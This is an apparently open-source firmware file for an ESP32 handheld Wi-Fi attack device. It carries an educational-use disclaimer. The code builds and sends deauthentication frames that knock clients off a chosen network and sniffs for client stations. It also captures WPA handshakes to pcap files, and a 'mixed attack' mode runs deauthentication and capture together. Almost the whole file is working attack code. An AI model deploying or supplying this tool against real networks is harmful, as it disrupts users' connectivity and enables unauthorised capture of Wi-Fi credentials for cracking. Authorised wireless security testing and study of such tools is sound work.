#include "wifi_module.h"
#include <esp_wifi.h>
#include <SD.h>

// ======================================================================================
// DISCLAIMER:
// This tool is intended for educational purposes and sanctioned security testing only.
// Use this tool only on networks you own or have explicit permission to test.
// The developers assume no liability for any misuse or damage caused by this program.
// ======================================================================================

// Global pointer for the callback to access the instance
static WiFiModule* wifiModuleInstance = nullptr;

// PCAP Global Header
struct pcap_hdr_t {
    uint32_t magic_number;   /* magic number */
    uint16_t version_major;  /* major version number */
    uint16_t version_minor;  /* minor version number */
    int32_t  thiszone;       /* GMT to local correction */
    uint32_t sigfigs;        /* accuracy of timestamps */
    uint32_t snaplen;        /* max length of captured packets, in octets */
    uint32_t network;        /* data link type */
};

// PCAP Packet Header
struct pcaprec_hdr_t {
    uint32_t ts_sec;         /* timestamp seconds */
    uint32_t ts_usec;        /* timestamp microseconds */
    uint32_t incl_len;       /* number of octets of packet saved in file */
    uint32_t orig_len;       /* actual length of packet */
};

// Deauth packet structure (Management Frame)
uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast (or target station)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason: Class 3 frame received from nonassociated STA
};

void WiFiModule::startDeauth() {
    isDeauthing = true;
    deauthPacketsSent = 0;
    
    // Parse BSSID from selectedTarget
    uint8_t bssid[6];
    sscanf(selectedTarget.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
           
    // Set source and BSSID in packet
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    // Set destination (Station or Broadcast)
    if (selectedStation.length() > 0) {
        uint8_t station[6];
        sscanf(selectedStation.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &station[0], &station[1], &station[2], &station[3], &station[4], &station[5]);
        memcpy(&deauthPacket[4], station, 6);
    } else {
        memset(&deauthPacket[4], 0xFF, 6);
    }
    
    // Set channel
    esp_wifi_set_channel(selectedTarget.channel, WIFI_SECOND_CHAN_NONE);
}

void WiFiModule::stopDeauth() {
    isDeauthing = false;
}

void WiFiModule::startStationScan() {
    isScanningStations = true;
    detectedStations.clear();
    wifiModuleInstance = this;
    
    // Set channel
    esp_wifi_set_channel(selectedTarget.channel, WIFI_SECOND_CHAN_NONE);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WiFiModule::snifferCallback);
}

void WiFiModule::stopStationScan() {
    isScanningStations = false;
    esp_wifi_set_promiscuous(false);
    wifiModuleInstance = nullptr;
}

void WiFiModule::startHandshakeCapture() {
    isCapturing = true;
    handshakesCaptured = 0;
    wifiModuleInstance = this;
    
    openPcapFile();

    // Set channel
    esp_wifi_set_channel(selectedTarget.channel, WIFI_SECOND_CHAN_NONE);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WiFiModule::snifferCallback);
}

void WiFiModule::stopHandshakeCapture() {
    isCapturing = false;
    esp_wifi_set_promiscuous(false);
    wifiModuleInstance = nullptr;
}

void WiFiModule::startMixedAttack() {
    isMixedAttack = true;
    isDeauthing = true;
    isCapturing = true;
    deauthPacketsSent = 0;
    handshakesCaptured = 0;
    wifiModuleInstance = this;

    openPcapFile();

    // Parse BSSID from selectedTarget
    uint8_t bssid[6];
    sscanf(selectedTarget.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
           
    // Set source and BSSID in packet
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);

    // Set destination (Station or Broadcast)
    if (selectedStation.length() > 0) {
        uint8_t station[6];
        sscanf(selectedStation.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &station[0], &station[1], &station[2], &station[3], &station[4], &station[5]);
        memcpy(&deauthPacket[4], station, 6);
    } else {
        memset(&deauthPacket[4], 0xFF, 6);
    }

    // Set channel
    esp_wifi_set_channel(selectedTarget.channel, WIFI_SECOND_CHAN_NONE);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WiFiModule::snifferCallback);
}

void WiFiModule::stopMixedAttack() {
    isMixedAttack = false;
    isDeauthing = false;
    isCapturing = false;
    esp_wifi_set_promiscuous(false);
    wifiModuleInstance = nullptr;
}

void WiFiModule::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* data = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    // Check for EAPOL packet (EtherType 0x888E)
    // IEEE 802.11 data frame structure is complex, simplified check:
    // We look for the EAPOL header pattern in the payload
    
    // This is a simplified check. A robust implementation would parse the 802.11 header.
    // EAPOL usually follows the LLC/SNAP header.
    
    // Station Sniffing Logic
    if (wifiModuleInstance && wifiModuleInstance->isScanningStations) {
        // Check for Data frames (Type 2, Subtype 0 or 8)
        // Frame Control (2 bytes) | Duration (2) | Addr1 (6) | Addr2 (6) | Addr3 (6)
        // Addr1: Receiver, Addr2: Transmitter, Addr3: BSSID (usually)
        
        // We want packets where either Addr1 or Addr2 matches our target BSSID
        // The other address is likely the station
        
        if (len > 24) {
            char addr1[18], addr2[18];
            sprintf(addr1, "%02x:%02x:%02x:%02x:%02x:%02x", 
                    data[4], data[5], data[6], data[7], data[8], data[9]);
            sprintf(addr2, "%02x:%02x:%02x:%02x:%02x:%02x", 
                    data[10], data[11], data[12], data[13], data[14], data[15]);
            
            String bssid = wifiModuleInstance->selectedTarget.bssid;
            bssid.toLowerCase();
            String a1 = String(addr1);
            String a2 = String(addr2);
            
            String station = "";
            if (a1 == bssid && a2 != bssid && !a2.startsWith("ff:ff")) station = a2;
            else if (a2 == bssid && a1 != bssid && !a1.startsWith("ff:ff")) station = a1;
            
            if (station.length() > 0) {
                bool found = false;
                for (const auto& s : wifiModuleInstance->detectedStations) {
                    if (s == station) {
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    wifiModuleInstance->detectedStations.push_back(station);
                }
            }
        }
    }

    for (int i = 0; i < len - 4; i++) {
        if (data[i] == 0x88 && data[i+1] == 0x8E) { // EtherType EAPOL
             if (wifiModuleInstance) {
                 wifiModuleInstance->handshakesCaptured++;
                 wifiModuleInstance->savePacketToSD(data, len);
             }
             break;
        }
    }
}

// This function should be called from the loop when isDeauthing is true
void WiFiModule::sendDeauthFrame() {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    deauthPacketsSent++;
}

void WiFiModule::drawTerminal(DisplayManager* display) {
    display->clearContent();
    
    String title = "Attack Status";
    if (isMixedAttack) title = "Mixed Attack";
    else if (isDeauthing) title = "Deauth Attack";
    else if (isCapturing) title = "Handshake Capture";
    
    display->drawMenuTitle(title);
    
    display->getTFT()->setTextDatum(TL_DATUM);
    display->getTFT()->setTextColor(THEME_TEXT, THEME_BG);
    
    // Fixed Y positions
    int yTarget = 35;
    int yChannel = 55;
    int yBSSID = 75;
    int ySep = 95;
    int yDeauth = 110;
    int yHandshake = 135;
    int yStatus = 160;
    
    display->getTFT()->drawString("Target:", 10, yTarget, 2);
    display->getTFT()->drawString(selectedTarget.ssid.substring(0, 15), 80, yTarget, 2);
    
    display->getTFT()->drawString("Channel:", 10, yChannel, 2);
    display->getTFT()->drawString(String(selectedTarget.channel), 80, yChannel, 2);
    
    display->getTFT()->drawString("BSSID:", 10, yBSSID, 2);
    display->getTFT()->drawString(selectedTarget.bssid, 80, yBSSID, 2);
    
    // Draw separator
    display->getTFT()->drawFastHLine(10, ySep, 300, THEME_TEXT);
    
    if (isDeauthing) {
        display->getTFT()->drawString("Deauth Pkts:", 10, yDeauth, 2);
        display->getTFT()->drawString(String(deauthPacketsSent), 120, yDeauth, 4);
    }
    
    if (isCapturing) {
        display->getTFT()->drawString("Handshakes:", 10, yHandshake, 2);
        display->getTFT()->drawString(String(handshakesCaptured), 120, yHandshake, 4);
    }
    
    // Status indicator
    display->getTFT()->setTextDatum(MC_DATUM);
    if ((millis() / 500) % 2 == 0) {
        display->getTFT()->setTextColor(TFT_RED, THEME_BG);
        display->getTFT()->drawString("ATTACK IN PROGRESS", 160, yStatus, 2);
    }
    
    display->getTFT()->setTextColor(THEME_TEXT, THEME_BG);
    // display->getTFT()->drawString("Long Press to Stop", 160, 160, 2); // Removed to avoid overlap
}

void WiFiModule::drawTerminalUpdate(DisplayManager* display) {
    display->getTFT()->setTextDatum(TL_DATUM);
    display->getTFT()->setTextColor(THEME_TEXT, THEME_BG);
    
    // Fixed Y positions matching drawTerminal
    int yDeauth = 110;
    int yHandshake = 135;
    int yStatus = 160;
    
    if (isDeauthing) {
        // Update Deauth Pkts count
        display->getTFT()->drawString(String(deauthPacketsSent), 120, yDeauth, 4);
    }
    
    if (isCapturing) {
        // Update Handshakes count
        display->getTFT()->drawString(String(handshakesCaptured), 120, yHandshake, 4);
    }
    
    // Status indicator
    display->getTFT()->setTextDatum(MC_DATUM);
    if ((millis() / 500) % 2 == 0) {
        display->getTFT()->setTextColor(TFT_RED, THEME_BG);
        display->getTFT()->drawString("ATTACK IN PROGRESS", 160, yStatus, 2);
    } else {
        // Clear the status text when blinking off
        display->getTFT()->setTextColor(THEME_BG, THEME_BG);
        display->getTFT()->drawString("ATTACK IN PROGRESS", 160, yStatus, 2);
    }
}
void WiFiModule::openPcapFile() {
    if (!SD.exists("/capture")) {
        SD.mkdir("/capture");
    }

    // Create a unique filename based on SSID and timestamp
    String ssidClean = selectedTarget.ssid;
    ssidClean.replace(" ", "_");
    // Limit length to keep filename reasonable
    if (ssidClean.length() > 15) ssidClean = ssidClean.substring(0, 15);
    
    // Remove any other invalid characters if necessary
    
    pcapFileName = "/capture/" + ssidClean + "_" + String(millis()) + ".pcap";
    
    File pcapFile = SD.open(pcapFileName, FILE_WRITE);
    if (pcapFile) {
        pcap_hdr_t pcapHeader;
        pcapHeader.magic_number = 0xa1b2c3d4;
        pcapHeader.version_major = 2;
        pcapHeader.version_minor = 4;
        pcapHeader.thiszone = 0;
        pcapHeader.sigfigs = 0;
        pcapHeader.snaplen = 65535;
        pcapHeader.network = 105; // DLT_IEEE802_11

        pcapFile.write((uint8_t*)&pcapHeader, sizeof(pcapHeader));
        pcapFile.close();
        // Serial.println("Created PCAP file: " + pcapFileName);
    }
}

void WiFiModule::savePacketToSD(uint8_t* buf, int len) {
    if (pcapFileName.length() == 0) return;

    File pcapFile = SD.open(pcapFileName, FILE_APPEND);
    if (pcapFile) {
        pcaprec_hdr_t packetHeader;
        unsigned long now = micros();
        packetHeader.ts_sec = now / 1000000;
        packetHeader.ts_usec = now % 1000000;
        packetHeader.incl_len = len;
        packetHeader.orig_len = len;

        pcapFile.write((uint8_t*)&packetHeader, sizeof(packetHeader));
        pcapFile.write(buf, len);
        pcapFile.close();
    }
}
